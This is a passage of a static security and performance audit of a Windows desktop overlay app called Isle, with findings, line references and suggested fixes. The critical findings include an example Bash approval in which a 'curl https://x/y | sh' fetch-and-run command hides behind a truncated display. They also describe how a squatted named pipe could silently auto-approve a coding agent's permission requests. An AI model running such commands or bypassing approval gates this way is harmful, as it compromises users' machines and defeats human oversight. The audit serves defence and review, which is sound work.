# Isle — software audit

Read-only static review of `/mnt/user-data/uploads/island/` (21.2 kLOC C#, .NET 10 / WPF).
No build, run or profile was possible (Linux host); everything below is derived from the source.
All line numbers are from the files as uploaded.

## Summary

The code is better than most one-person desktop projects: module lifetimes are real (factories, `Start`/`Stop`,
`Dispose`), WinRT/COM event handlers are mostly unsubscribed, GDI handles are released, the Whisper download is
size- *and* SHA-256-verified before use, DPAPI is used for keys and clipboard text, the log never carries user
content, and timers inside tab views are correctly gated on `OnShown`/`OnHidden`. Reminders handle DST, clock
changes and resume-from-sleep properly. That part of `VERIFICATION.md` holds up.

Three things matter most, and all three contradict the headline numbers in `SPEC.md` §2 / `PROGRESS.md`:

1. **A global `WH_KEYBOARD_LL` hook is installed on the UI thread by default, just to show a Caps Lock pill**
   (`Sources.cs:634`). Every keystroke on the machine is routed through Isle's message loop before reaching the
   target app — and that same thread also PNG-encodes and SHA-256s clipboard images, writes JSON stores
   synchronously, calls `SHGetFileInfo`, and runs a **blocking, compacting gen2 GC after every collapse**
   (`Hover.cs:144` → `Memory.cs:43`). Any of those exceeding `LowLevelHooksTimeout` means system-wide input lag,
   and Windows then silently uninstalls the hook.
2. **"Event-driven everywhere except one ~30 ms cursor timer" is not true.** With default settings there are at
   minimum a 500 ms timer, a 2 s timer, a 15 s full process-table enumeration, and — if a single abandoned
   `*.crdownload` sits in Downloads — a permanent 1 Hz `FileInfo` poll. See *Efficiency: measured-by-reading*.
3. **The agent approval UI truncates the thing being approved.** A `Bash` permission request renders at most
   400 chars, clipped to a 34 px two-line box with an ellipsis, with **Allow** next to it (`AgentsView.cs:156`,
   `AgentText.cs:49`). Combined with a predictable, squattable pipe name and an unconditionally fail-open hook,
   the approval path is the weakest security surface in the app.

The 0.29 % / 25 MB idle figure is plausible *as measured* (nothing playing, clean Downloads folder, no OBS) but
it is not the state this app actually runs in all day, and the 25 MB is partly manufactured by `EmptyWorkingSet`.

---

# Critical

## C1. Global low-level keyboard hook shares a thread with blocking work — FIXED 2fcdb2a
`src/Isle/Modules/LiveEvents/Sources.cs:626-643` (install), `src/Isle/Core/Memory.cs:37-50`,
`src/Isle/Modules/Clipboard/ClipboardService.cs:131-146`, `src/Isle/Views/ShellIcons.cs:14-46`

`CapsLockSource.Start()` calls `SetWindowsHookEx(WH_KEYBOARD_LL, …)` from the WPF UI thread. It is on by
default: `LiveEventsModule.IsSourceEnabled` returns `OptBool($"live.{name}", name != "notifications")`, so
`live.caps` defaults to **on** (`LiveEventsModule.cs:20-21`).

Microsoft's own documentation ([LowLevelKeyboardProc](https://learn.microsoft.com/windows/win32/winmsg/lowlevelkeyboardproc)): "This hook is called in the context of the thread that
installed it. The call is made by sending a message to the thread that installed the hook. Therefore, the thread
that installed the hook must have a message loop." And on timeout: "The hook procedure
should process a message in less time than the data entry specified in the LowLevelHooksTimeout value… If the hook
procedure times out, the system passes the message to the next hook. However, on Windows 7 and later, the hook is
silently removed without being called. There is no way for the application to know whether the hook is
removed." The recommended shape is explicit: "If the application must use low level
hooks, it should run the hooks on a dedicated thread that passes the work off to a worker thread and then
immediately returns. In most cases where the application needs to use low level hooks, it should monitor raw input
instead."

Isle's UI thread does, synchronously:
- `Memory.TrimNow()` — `GCSettings.LargeObjectHeapCompactionMode = CompactOnce` plus
  `GC.Collect(MaxGeneration, Aggressive, blocking: true, compacting: true)` plus `WaitForPendingFinalizers()`.
  The project sets `ConcurrentGarbageCollection=false` (`Isle.csproj`), so there is no background GC to help.
  This is scheduled 5 s after **every single collapse** (`Hover.cs:144`), i.e. dozens of times an hour.
- `ClipboardService.AddImage` on every machine-wide image copy: `CopyPixels` of up to 40 MP (160 MB),
  a full-buffer alpha scan, `PngBitmapEncoder.Save`, `SHA256.HashData` over all pixels, `File.WriteAllBytes`.
- `ShellIcons.For` → `SHGetFileInfo` per visible command-bar/shelf row (shell extensions, possibly a dead
  network path).
- `JsonStore.Save` for notes (every 500 ms while typing), clipboard (1 s debounce), settings.

**Failure:** copy a 4K screenshot, or hover the island and hit the trim 5 s later, and every keystroke
system-wide is delayed by the duration of that work. Over ~1 s (Win10 1709+ caps `LowLevelHooksTimeout` at
1000 ms) the hook is torn down and the Caps indicator dies silently for the rest of the session.

**Fix (in order of value):**
1. Delete `CapsLockSource`, or move it off the UI thread. Dedicated-thread version:
   ```csharp
   // CapsLockSource.Start()
   _thread = new Thread(() => {
       _proc = Hook;                                   // field: keeps the delegate alive
       _hook = Native.SetWindowsHookEx(Native.WH_KEYBOARD_LL, _proc, Native.GetModuleHandle(null), 0);
       _ready.Set();
       while (Native.GetMessage(out var m, IntPtr.Zero, 0, 0) > 0) { /* hook is dispatched here */ }
       Native.UnhookWindowsHookEx(_hook);
   }) { IsBackground = true, Name = "IsleCapsHook" };
   _thread.Start();
   ```
   `Hook` must do nothing but `sink.Ui.BeginInvoke(Show)` and `CallNextHookEx` (it already does). Stop it by
   `PostThreadMessage(threadId, WM_QUIT, 0, 0)`. Keep `_proc` in a field (it already is) — the native side holds
   a raw pointer.
2. Stop calling `Memory.TrimSoon` from `Collapse()` (see E1).
3. Move clipboard image encoding/hashing to `Task.Run` (see H2).

## C2. The pipe name is predictable and can be claimed by any same-user process before Isle starts — FIXED 9e22d9b
`src/Isle.Hook/HookProtocol.cs:24-32, 139-178`, `src/Isle/Modules/Agents/AgentPipeServer.cs:29-31`

The name is `"Isle.Agents.v1." + sanitized(Environment.UserName)` — fully predictable. The server creates the pipe
with `PipeOptions.CurrentUserOnly` (a DACL granting the current user) and `MaxAllowedServerInstances`. The client
also passes `CurrentUserOnly`, which only verifies that the server runs **as the same user** — it does not verify
*which* process.

So any code already running as Bohdan (a malicious `postinstall` script, a trojaned VS Code extension, anything
in `%APPDATA%`) can:
- **Squat** the name before Isle starts, or add an instance to the existing name, and answer hook calls itself.
  Since the hook turns a reply of `{"decision":"allow"}` into
  `hookSpecificOutput.decision.behavior = "allow"` (`HookProtocol.cs:95-103`), the squatter gets to
  **silently auto-approve every permission request Claude Code makes** — no prompt, no record, nothing on screen.
  This is a documented class of attack ([Named pipes under attack](https://www.bleepingcomputer.com/news/security/named-pipes-under-attack-securing-windows-interprocess-communication/)): "A predictable pipe name is only an identifier. It is
  not a secret and does not prove which process created the pipe." "An attacker may
  create a pipe using the expected name before the legitimate server starts". The recommended posture:
  "The client must verify the server just as the server verifies the client."
- **Connect as a client** and inject fabricated sessions/prompts/tool descriptions into the Agents tab, or hold
  the server busy.

Severity here is "same-user-to-same-user", which on a personal box is not a privilege boundary for *file* access —
but it *is* a boundary for the approval decision, which is the whole point of the feature. It turns "I review what
my coding agent does" into "something decided for me".

**Fix:**
1. Server: create the first instance with `FILE_FLAG_FIRST_PIPE_INSTANCE` so a squatter is detected. .NET does not
   expose the flag on `NamedPipeServerStream`; use `CreateNamedPipe` via P/Invoke for instance #1 (flag
   `0x00080000`) and wrap the handle, or at minimum call
   `WaitNamedPipe(@"\\.\pipe\" + name, 1)` before `Start()` and refuse to run the Agents module (with a visible
   warning, not a `Logger.Warn`) if the name already exists. The article notes the first-instance option
   "does not replace proper access controls or server identity verification" — correct,
   it is a detector, not a fix on its own.
2. Client (`HookProtocol.RunClientAsync`): after `ConnectAsync`, call `GetNamedPipeServerProcessId` and verify the
   server's image path is the `Isle.exe` next to `Isle.Hook.exe` (and/or that its Authenticode/file hash matches).
   Treat a mismatch as fail-open-with-no-decision, exactly like "island not running".
3. Make the name unguessable as defence in depth: generate a random suffix at first run, store it in
   `%APPDATA%\Isle\pipe.name` (user-only ACL), and write the full name into the hook's `args` at install time
   (`HookInstaller.Handler`). A squatter then has to read a file first, and `FIRST_PIPE_INSTANCE` catches the race.
4. Validate the envelope: `HookMessage.Parse` ignores `o["v"]` entirely (`AgentBook.cs:14-26`). Reject anything
   whose `v != HookProtocol.Version`, and cap `input` depth/size (`MaxLineBytes` is 1 MiB, which is already a
   1 MiB UI-thread JSON parse per connection).

## C3. Permission prompts are approved from a truncated, sometimes wrong, summary — FIXED e995dfa
`src/Isle/Views/Agents/AgentsView.cs:148-168`, `src/Isle/Modules/Agents/AgentText.cs:33-49`

`PermissionBody` renders `r.Detail` in a `TextBlock` with `MaxHeight = 34`, `TextTrimming.CharacterEllipsis`, and
`ToolTip = r.Detail`, then puts **Allow / Deny / Terminal** underneath. `AgentText.Detail` hard-truncates at
`MaxDetail = 400` chars (`AgentText.cs:49`), so the tooltip is truncated too. A realistic
`Bash` command of several hundred characters, or any multi-line command, is therefore approved on the basis of
roughly the first two visual lines.

Worse, for a tool `Detail` does not know (every MCP tool, for instance), it falls back to
"the first non-empty string property of `tool_input`" (`AgentText.cs:46-48`). The user is then shown an arbitrary
field — which may be innocuous while a sibling field carries the dangerous part.

**Failure:** Claude Code requests
`Bash: npm run build` … 300 chars later … `; curl https://x/y | sh`. Isle shows `npm run build …`. The user clicks
Allow. Isle replies `allow`. Claude Code runs the **full, untruncated** command.

**Fix:**
- Never truncate in an approval surface. Keep the full `tool_input` text on `AgentRequest` (a second field, so
  `LastAction` summaries stay short) and render it in a `ScrollViewer` with `MaxHeight` ≈ 100 and
  `TextWrapping.Wrap`, monospace, with a visible scrollbar so it is obvious there is more.
- If it does not fit, disable **Allow** until the body has been scrolled to the end, or show only
  **Deny / Decide in terminal** for over-long bodies. Falling back to the terminal is already implemented
  (`Actions().Terminal`) and is the safe default.
- Drop the "first string property" fallback for unknown tools. Show `tool_name` plus a rendered JSON of
  `tool_input` (capped by *scroll*, not by substring), or no detail and only the Deny/Terminal choice.

---

# High

## H1. `live` sources run unconditional periodic timers, including a full process enumeration — FIXED 76ee049
`src/Isle/Modules/LiveEvents/Sources.cs:582` (500 ms), `:326` (15 s), `:337`

- `KeyboardLayoutSource` starts a **500 ms** `DispatcherTimer` and never stops it while the module is enabled.
  Each tick: `GetForegroundWindow` → `GetWindowThreadProcessId` → `GetKeyboardLayout` →
  `CultureInfo.GetCultureInfo`. Two UI-thread wakeups per second, forever, to catch Win+Space.
- `ObsSource` starts a **15 s** probe which calls `Process.GetProcessesByName("obs64")` **and**
  `Process.GetProcessesByName("obs")`. Each call snapshots the entire system process table
  (`NtQuerySystemInformation`, a large pooled buffer, a managed `Process[]`), and the returned `Process` objects
  are never disposed. This runs forever on a machine that has never had OBS installed.
- `ObsSource.Probe` also has **no backoff**: if OBS is running with the WebSocket server disabled,
  `ConnectAsync` throws `WebSocketException` every 15 s indefinitely, silently.

On a laptop these wakeups are what stop the CPU reaching deep idle; Windows cannot coalesce a 500 ms timer into
anything useful.

**Fix:**
- Layout: drop the timer. `WM_INPUTLANGCHANGE` is per-window, but `SetWinEventHook(EVENT_OBJECT_FOCUS)` plus the
  existing `ForegroundWatcher.Changed` covers nearly every real case; if Win+Space must be caught, raise the
  interval to 2 s and only run it while the island is visible and not edge-hidden. Better: register a raw-input
  device or piggyback on the already-existing foreground hook and accept a one-focus-change delay.
- OBS: replace the process scan with a cheap existence test on the pipe/port, e.g. a single
  `TcpClient.ConnectAsync("127.0.0.1", port)` with a 200 ms timeout — the same cost as the connect you are about
  to do anyway, with none of the process-table work. Raise the probe to 60 s, add exponential backoff to 5 min
  after consecutive failures, and reset it on `NetworkChange`. If you keep `GetProcessesByName`, dispose the
  results: `foreach (var p in Process.GetProcessesByName("obs64")) p.Dispose();`
- Both: gate every live source on "is the island actually shown" where the indicator is only meaningful when
  visible.

## H2. One abandoned `*.crdownload` keeps a 1 Hz file poll alive for the life of the process — FIXED 76ee049
`src/Isle/Modules/LiveEvents/Sources.cs:48-77, 106-118`

`Start()` scans the Downloads folder and calls `Touch(f, existing: true)` for every partial file; `Touch`
unconditionally starts `_tick` (1 s). `Sample()` only stops the timer when `_active.Count == 0`, and only removes
an entry when `!File.Exists(path)`. A stale `*.crdownload` / `*.part` / `*.partial` / `*.download`
(`Parsers.cs:9`) — a very common leftover from a cancelled download — therefore pins a permanent 1 Hz timer doing
`File.Exists` + `new FileInfo(path).Length` + a LINQ `Where(...).ToList()` + `_active.ToList()` allocation per
tick, while the pill itself stays hidden because `LastGrowth` is `MinValue`.

**Fix:** in `Sample()`, drop entries that have not grown for the display window and stop the timer when nothing is
live, not when nothing is tracked:
```csharp
void Sample() {
    var now = DateTimeOffset.Now;
    foreach (var (path, item) in _active)          // iterate, collect removals
        …
    foreach (var path in dead) _active.Remove(path);                 // !File.Exists
    var live = _active.Values.Any(i => now - i.LastGrowth < TimeSpan.FromSeconds(60));
    if (!live) _tick!.Stop();                       // FSW events restart it via Touch
    Update();
}
```
`Touch` must then also restart `_tick` when a watcher event fires, which it already does.

## H3. A blocking, compacting gen2 GC + `EmptyWorkingSet` after every collapse — FIXED 76ee049
`src/Isle/IslandWindow.Hover.cs:144`, `src/Isle/Core/Memory.cs:21-50`

`Collapse()` schedules `Memory.TrimSoon(5)`, whose tick runs `LargeObjectHeapCompactionMode.CompactOnce` +
`GC.Collect(MaxGeneration, GCCollectionMode.Aggressive, blocking: true, compacting: true)` +
`GC.WaitForPendingFinalizers()` + `EmptyWorkingSet` — on the UI thread, with concurrent GC disabled.

Consequences:
- A full compacting gen2 GC is tens of milliseconds even on a small heap; `Aggressive` mode is explicitly the
  most expensive option. It happens after every hover-and-leave, i.e. constantly during normal use.
- During that pause the keyboard hook (C1) cannot run, and `IAudioEndpointVolumeCallback` / `IMMNotificationClient`
  marshalled onto this STA cannot return either.
- `EmptyWorkingSet` does not free memory, it moves the pages to the standby list; the next frame faults them
  straight back in. It makes the "25 MB working set" number true and the app slower. It is a vanity metric.
- It also writes a `Logger.Info` line every time, so `log.txt` churns through its 1 MB rotation from idle use alone.

**Fix:** remove the `TrimSoon` call from `Collapse()` entirely. Keep `TrimSoon` only where a genuinely large,
now-dead allocation existed: after Whisper unload (`WhisperEngine.cs:90`), after a recording/OCR
(`ToolsModule.cs:168`), after an AI stream (`AiModule.cs:190`) — and there, drop `Aggressive` and the LOH
compaction to `GC.Collect(2, GCCollectionMode.Forced, blocking: false)` plus, if you insist on the number,
`EmptyWorkingSet`. Also consider re-enabling `ConcurrentGarbageCollection` (`Isle.csproj`); the ~1 extra MB of
committed memory buys you non-blocking gen2 collections in a latency-sensitive always-on overlay.

## H4. Clipboard capture does megabyte-scale work on the UI thread for every copy on the machine
`src/Isle/Modules/Clipboard/ClipboardService.cs:81-152`

`WM_CLIPBOARDUPDATE` → `Capture()` → for images: `FormatConvertedBitmap.CopyPixels` into
`new byte[w*h*4]` (allowed up to 40 MP ⇒ 160 MB, straight to the LOH), `AllTransparent` full scan, possible
in-place alpha rewrite, `PngBitmapEncoder.Save` to a `MemoryStream`, `SHA256.HashData` over all pixels,
`File.WriteAllBytes`. For text: up to 1 MB string plus a linear `e.Text == text` compare across 200 entries.
All on the UI thread, for every copy in every application.

**Failure:** Win+Shift+S a 4K region → Isle freezes for ~0.2–1 s, the island animation stutters, and per C1 the
whole machine's keyboard stalls with it. Repeated large copies also churn the LOH, which then triggers the
compacting GC from H3.

**Fix:** read the clipboard on the UI thread (required — clipboard is STA/per-thread), then hand off:
```csharp
if (Clipboard.ContainsImage() && Clipboard.GetImage() is { } img) {
    img.Freeze();                                  // required before crossing threads
    _ = Task.Run(() => {
        var (png, hash, w, h) = Encode(img);       // CopyPixels/PNG/SHA-256 off-thread
        _ui.BeginInvoke(() => _store.AddImage(png, hash, w, h));
    });
}
```
Also lower the ceiling: 40 MP is absurd for a history thumbnail list. Cap at ~8 MP, and store a downscaled
`DecodePixelWidth`-style preview next to the original rather than hashing full pixels (hash the PNG bytes instead —
same dedupe quality, one pass).

## H5. With `chars.inPill` on, mouse movement anywhere drives a 30 fps software repaint all day
`src/Isle/Views/Characters/CreatureView.cs:75-111`, `src/Isle/Modules/Characters/CreatureBrain.cs:47-53, 78-83`

`Tick()` computes `_gazeTarget` from the cursor position via `CreatureBrain.EyeOffset(dx, dy, 1.5, reach: 260)`.
That returns a *direction* scaled by distance, so it changes whenever the cursor moves **anywhere on screen**, not
just nearby. `moving` then becomes true and `FrameRate(Awake, eyesMoving: true, …)` returns **30**, so the view
calls `InvalidateVisual()` 30×/s for as long as the mouse is in motion. The island is
`AllowsTransparency="True"` (`IslandWindow.xaml:6`) and the process sets
`RenderMode.SoftwareOnly` by default (`App.xaml.cs:52-53`), so every one of those frames is a CPU rasterization
plus a layered-window present.

`chars.inPill` defaults off, so this is opt-in — but it is exactly the kind of option a user turns on and forgets.
The panel creature has the same behaviour while expanded (bounded by the hover session, so it matters less).

**Fix:**
- Only track the cursor when it is plausibly near: if `Math.Sqrt(dx*dx+dy*dy) > reach`, return `default` from
  `GazeTarget()` so a far-away mouse produces no change and the view drops to 8 fps.
- Quantize the gaze: round the offset to ~0.25 design units before comparing, so sub-pixel changes do not
  re-render.
- Cap the pill creature to 12–15 fps; at 22 px nobody can tell.

## H6. VPN and system commands launch executables by bare name — FIXED 76ee049
`src/Isle/Modules/ControlCenter/Vpn.cs:51, 81`, `src/Isle/Modules/Commands/Providers.cs:120-121, 148`

`new ProcessStartInfo("rasdial.exe")` and `Run("shutdown.exe", "/r /t 0")` with `UseShellExecute = false` go to
`CreateProcess` with an unqualified name, which searches the **application directory and the current working
directory before System32**. Isle is launched from `%APPDATA%`-adjacent paths by Autostart, and its CWD is whatever
the launcher left it as. A `rasdial.exe` or `shutdown.exe` dropped in either location is executed instead of the
real one, on a user action that looks completely safe.

Argument construction itself is fine — `psi.ArgumentList.Add(a)` is used for the VPN CLIs
(`Vpn.cs:82`), so phonebook entry names cannot inject arguments. The command bar's launcher uses
`UseShellExecute = true` with no arguments, which is the correct shape for a launcher.

**Fix:** always fully qualify system binaries:
```csharp
static string Sys(string exe) => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), exe);
// "rasdial.exe" -> Sys("rasdial.exe"); "shutdown.exe" -> Sys("shutdown.exe")
```
The third-party VPN CLIs are already absolute paths from `Clients()`, which is right.

---

# Medium

## M1. The media session is matched by app id, so a restarted player stops updating — FIXED 76ee049
`src/Isle/Modules/Media/MediaSession.cs:92-93, 58-90`

`SameSession` compares `SourceAppUserModelId` only. When Spotify (or any player) is closed and reopened, GSMTC
hands out a **new** `GlobalSystemMediaTransportControlsSession` object with the same AUMID. `Choose()` then decides
`SameSession(chosen, _session) == true`, keeps the old, dead session object, and never re-subscribes. The pill and
the Music tab freeze on the last known track and `PlayPause()/Next()` go to a dead object until some *other* app's
session wins the selection.

**Fix:** compare object identity for the "do I need to resubscribe" decision and keep the AUMID only for the
*choice*:
```csharp
if (!ReferenceEquals(chosen, _session)) { Unsubscribe(); _session = chosen; … }
```
`chosen` comes from `_manager.GetSessions()` each time, so WinRT identity is stable for a live session and differs
for a fresh one. `UNVERIFIED — needs a run on Windows`: close and reopen Spotify mid-playback and confirm the pill
keeps tracking. (RCW identity for WinRT objects is preserved per-object, so this should hold, but confirm.)

## M2. `Dispatcher.Invoke` (blocking) from the OBS WebSocket read loop — FIXED 76ee049
`src/Isle/Modules/LiveEvents/Sources.cs:372, 380`

Inside `RunAsync`, on a thread-pool thread, `sink.Ui.Invoke(...)` blocks the socket loop until the UI thread is
free. The UI thread may be inside the H3 blocking GC, or inside an OCR/PNG encode, or itself waiting on something.
Every other callback in the file correctly uses `BeginInvoke`. These two are the exceptions.

**Fix:** `sink.Ui.BeginInvoke(...)` in both places. Nothing downstream needs the synchronous result.

## M3. `CancellationTokenSource` / `MMDevice` / wait-handle leaks on repeated use
- `Sources.cs:344, 390` — `_cts` is created per OBS connection and set to `null` in `finally`, never `Dispose()`d.
  One `CancellationTokenSource` (plus its timer registration) leaks per reconnect attempt; with the 15 s probe and
  OBS running-but-unreachable that is ~240/hour.
- `src/Isle/Modules/Voice/MicCapture.cs:184-194` — `en.GetDefaultAudioEndpoint(...)` returns an `MMDevice`
  (IDisposable, holds COM refs) that is never disposed. One per recording.
- `src/Isle/Modules/Tools/Recorder.cs:124` — `new MMDeviceEnumerator()` and the returned `MMDevice` are both
  undisposed; `_frameArrived` (`AutoResetEvent`) and `_stopSignal` (`ManualResetEvent`) are created at
  construction (`Recorder.cs:49-50`) and **not** disposed in `Dispose()` — two kernel handles per recording.

**Fix:** `using` / explicit `Dispose()` in each place; add `_frameArrived.Dispose(); _stopSignal.Dispose();` to the
end of `Recorder.Dispose()`.

## M4. `WriteAtomic` is rename-atomic but not crash-durable, and has no retry — FIXED 76ee049
`src/Isle/Core/JsonStore.cs:54-68`

`File.WriteAllText(tmp)` + `File.Move(tmp, path, overwrite: true)` gives atomic *replacement*, but the temp file's
data is not flushed before the rename. On power loss or a hard reset you can end up with a correctly-named,
zero-length or partially-written `notes.json` — at which point `Load<T>` backs it up and hands you a `new T()`,
i.e. **all notes silently gone** (the `.bak-…` is there, but empty).

Separately: if `path` is momentarily open by an AV scanner or a backup tool, `File.Move` throws, `Save` logs and
returns `false`, and the caller (`NotesStore.Save`, `ClipStore.Save`) ignores the result — a silent lost write.

**Fix:**
```csharp
public static void WriteAtomic(string path, string text) {
    Directory.CreateDirectory(Path.GetDirectoryName(path)!);
    var tmp = path + ".tmp";
    using (var fs = new FileStream(tmp, FileMode.Create, FileAccess.Write, FileShare.None)) {
        using var w = new StreamWriter(fs);
        w.Write(text); w.Flush();
        fs.Flush(flushToDisk: true);              // the missing piece
    }
    for (var i = 0; ; i++) {
        try { File.Move(tmp, path, overwrite: true); return; }
        catch (IOException) when (i < 3) { Thread.Sleep(50 * (i + 1)); }
    }
}
```
And in `JsonStore.Load`, when the file exists but is empty or whitespace, prefer the newest `*.bak-*` sibling
before giving up and returning `new T()`.

## M5. Fullscreen housekeeping re-enumerates every monitor every 2 seconds — FIXED 76ee049
`src/Isle/IslandWindow.Hover.cs:300-312, 274-291`, `src/Isle/Core/Screens.cs:10-35`

`HideInFullscreen` defaults to **true** (`Settings.cs:22`), so a 2 s `DispatcherTimer` runs for the whole session.
Each tick calls `CheckForeground()` → `ForegroundWatcher.IsFullscreen(fg, Screen)`, and the `Screen` property calls
`Screens.Selected(...)` → `Screens.All()` → `EnumDisplayMonitors` with a fresh managed delegate, a
`List<ScreenInfo>`, `GetMonitorInfo` + `GetDpiForMonitor` per monitor, a sort — plus
`SHQueryUserNotificationState`, `GetClassName` (new 128-char `StringBuilder`), `IsZoomed`, `GetWindowRect`. If
`ExcludedApps` is non-empty it also does `Process.GetProcessById` + `ProcessName`.

**Fix:** cache the monitor list and invalidate it on `WM_DISPLAYCHANGE` / `WM_DPICHANGED` / `WM_SETTINGCHANGE`
(all three are already handled in `WndProc`, `IslandWindow.xaml.cs:328-338`). Then raise the housekeeping interval
to 5 s, and skip the whole check when `SHQueryUserNotificationState` is unchanged since last tick. Better: start
the timer only while the *foreground window is a candidate* (not our own, not a shell class) and stop it otherwise.

## M6. Streaming AI answers are O(n²) in string concatenation and re-render the whole message
`src/Isle/Modules/AiChat/AiModule.cs:173`, `src/Isle/Views/AiChat/AiChatView.cs:30, 233-239`

`answer.Text += piece` per delta: a 40 KB answer arriving in ~2000 pieces allocates ~40 MB of intermediate
strings, which then provokes the GC that H3 makes blocking. `RenderStreaming` (every 80 ms) calls
`FillAnswer` → `MarkdownView.Render(m.Text)` on the **entire** message, rebuilding the whole element subtree
~12×/s and re-parsing all of the markdown each time.

**Fix:** keep a `StringBuilder` on `ChatMessage` for the in-flight text and expose `Text` as
`_sb?.ToString() ?? _text` only when a render actually needs it; assign the final string once on completion.
For rendering, re-render only the last block (markdown blocks before the last `\n\n` are final), or at minimum
drop the render tick to 150 ms.

## M7. Core Audio callbacks are marshalled onto the UI thread
`src/Isle/Modules/ControlCenter/AudioVolume.cs:28-40, 120-146`

The `IMMDeviceEnumerator` RCW and the two managed callback objects are created on the WPF STA thread, so COM
marshals `OnNotify` / `OnDefaultDeviceChanged` back to that apartment. The `_ui.BeginInvoke` inside is then
redundant — and, more importantly, the audio engine's notification call now blocks on Isle's message pump. Combine
with H3's blocking GC or H4's PNG encode and a volume-key press can stall briefly in the audio service.

**Fix:** either construct `AudioVolume` on a dedicated MTA thread (`Thread { ApartmentState = MTA }`) so the
callbacks arrive free-threaded and only the `BeginInvoke` touches the UI, or keep it as is and make sure nothing
long-running ever runs on the UI thread (i.e. fix C1/H3/H4 first).
`UNVERIFIED — needs a run on Windows`: block the UI thread for 3 s (`Thread.Sleep` in a button handler) and check
whether system volume changes and device switches are delayed.

## M8. `DispatcherUnhandledException` swallows everything and can self-amplify
`src/Isle/App.xaml.cs:171-185`

`a.Handled = true` for every UI exception keeps the island alive, which is the right instinct for a daily driver —
but a bug in a layout or render path throws on *every* frame, and each throw writes a full stack trace through
`Logger.Error`. At 60 fps the 1 MB log rotates in seconds and the app does nothing but write disk. There is also no
visible signal: a tab that fails silently every frame looks like "nothing happens".

**Fix:** add rate limiting and a user-visible fallback in `Logger`: keep a small dictionary of
`message → (count, firstSeen)`, log the first 3 occurrences then one summary per minute. In
`DispatcherUnhandledException`, after N exceptions from the same site inside 10 s, stop the offending module
(`App.Host.Stop(id)`) and show a toast rather than looping.
`AppDomain.CurrentDomain.UnhandledException` (`:178`) only logs — a background-thread throw still kills the
process. The main paths are `Task.Run`-wrapped with try/catch, so this is mostly theoretical, but the
`async void` handlers at `ControlView.cs:206-330` and `WeatherView.cs:188` would benefit from a top-level try.

## M9. Steam manifests are read on the UI thread with a spin-retry
`src/Isle/Modules/LiveEvents/Sources.cs:474-503`

`FileSystemWatcher` on each Steam library with `NotifyFilters.LastWrite | FileName | Size`; every event does
`sink.Ui.BeginInvoke(() => Read(path))`, and `Read` does `File.ReadAllText` with up to 3 attempts separated by
`Thread.Yield()` — a busy spin on the UI thread. During an active download Steam rewrites `appmanifest_*.acf`
frequently, so this is a stream of UI-thread file reads plus a full `Steam.FromManifest` parse each time.

**Fix:** debounce per path (250–500 ms `DispatcherTimer`, same pattern as `MicCameraSource`), do the read and parse
in `Task.Run`, and marshal only the parsed `SteamDownload` back. Replace `Thread.Yield()` with
`await Task.Delay(30)`.

## M10. `AppIndex` rebuilds a full filesystem walk on (almost) every command-bar open
`src/Isle/Modules/Commands/AppIndex.cs:22, 36-59, 104-130`

`MaxAge` is 10 minutes, and `Refresh()` runs on every `Toggle()`. A rebuild spins an STA thread that enumerates
`shell:AppsFolder` through `Shell.Application` COM (with a 20 s `Join`), walks both Start-menu trees with no depth
limit, reads 150 Recent shortcuts, walks the user's configured folders up to 30 000 entries, and then serializes
all of it to `index.json`. Opening the command bar 20 times across a day = 20 full walks.

Also `_built` is a `DateTimeOffset` field written from the pool thread and read from the UI thread with no
synchronization; it is larger than a pointer, so a torn read is possible (harmless — a spurious rebuild — but it is
the kind of thing that becomes confusing later). Mark it `volatile`-equivalent by storing ticks in a `long` and
using `Interlocked.Read`/`Exchange`.

**Fix:** raise `MaxAge` to ~6 hours; invalidate early with `FileSystemWatcher`s on the two Start-menu folders
(they change rarely and the events are cheap); re-run the `shell:AppsFolder` enumeration at most once per session
unless a Start-menu change was seen.

## M11. `IdleHttp` can dispose an `HttpClient` out from under an in-flight request
`src/Isle/Core/IdleHttp.cs:28-50`

`Client()` returns the `HttpClient` and arms a 2-minute timer; `Release()` disposes it under the lock while the
caller may still be awaiting. Today every `IdleHttp` user (weather, lyrics, currency) finishes well inside 2
minutes, so this is latent rather than live — but the failure mode is an `ObjectDisposedException` surfacing as a
mystery "http failed" and a lost refresh.

**Fix:** reference-count in-flight requests, or simply never dispose: a single process-lifetime `HttpClient` with
`SocketsHttpHandler { PooledConnectionIdleTimeout = TimeSpan.FromSeconds(30) }` releases its sockets on idle while
keeping the object alive, which is what you actually wanted. That also removes the per-2-minutes handler
re-creation and DNS re-resolution.

---

# Low

## L1. Whisper model integrity is verified at download but not at load
`src/Isle/Modules/Voice/VoiceModels.cs:12, 29-74`

The download path is done right: pinned SHA-256, size check, `*.part` → verify → `File.Move`, delete on any
failure. But `IsDownloaded` only checks `File.Exists && Length == Size`, and `WhisperFactory.FromPath` is then
handed the file. `%APPDATA%\Isle\models\ggml-base.bin` is writable by anything running as the user; a
same-size, tampered model is loaded into whisper.cpp's native parser without a second look.

**Fix:** hash on first load per process (147 MB SHA-256 is ~0.3 s on a background thread, once) and cache
`(path, size, mtime) → verified` in settings so the normal case is free.

## L2. The hook helper lives in a user-writable directory and is invoked by Claude Code constantly
`src/Isle/Modules/Agents/HookInstaller.cs:77, 224-231`

`InstalledExe` is `%APPDATA%\Isle\bin\Isle.Hook.exe`, and that absolute path is written into
`~/.claude/settings.json`. Anything that can write to `%APPDATA%` gets a process launched on every
`SessionStart` / `UserPromptSubmit` / `PreToolUse`. This is not a privilege boundary (the same actor could edit
`settings.json` directly) but it is a convenient persistence foothold with no file-integrity check.

**Fix:** low priority; if you want it, record the helper's SHA-256 in `settings.json` (Isle's own) at install time
and re-verify it on startup, warning in the Agents tab on mismatch.

## L3. Notes are stored in plaintext while clipboard text is encrypted
`src/Isle/Modules/Notes/NotesStore.cs:170-172` vs `src/Isle/Modules/Clipboard/ClipStore.cs:411-418`

Clipboard entries get DPAPI; `notes.json` is plain JSON with the full note XAML and plaintext. Chat bodies
(`chats.json`) likewise. If the DPAPI choice for the clipboard was deliberate (it reads that way), notes and chats
are the more sensitive of the three. Note that DPAPI-CurrentUser with a hardcoded entropy
(`Secret.cs:10`) protects against another *user* or a stolen disk, not against another process running as Bohdan —
worth being explicit about in `DECISIONS.md` so the protection isn't over-trusted.

## L4. `Settings.Current` lazy init is not thread-safe; `SetWindowLongPtr` has no `SetLastError`
`src/Isle/Core/Settings.cs:38-39`, `src/Isle/Native.cs:33-37`

`_current ??= Load(...)` can run twice if ever touched from two threads (today everything is UI-thread, so this is
prophylactic). `GetWindowLongPtrW`/`SetWindowLongPtrW` are declared without `SetLastError = true`, so
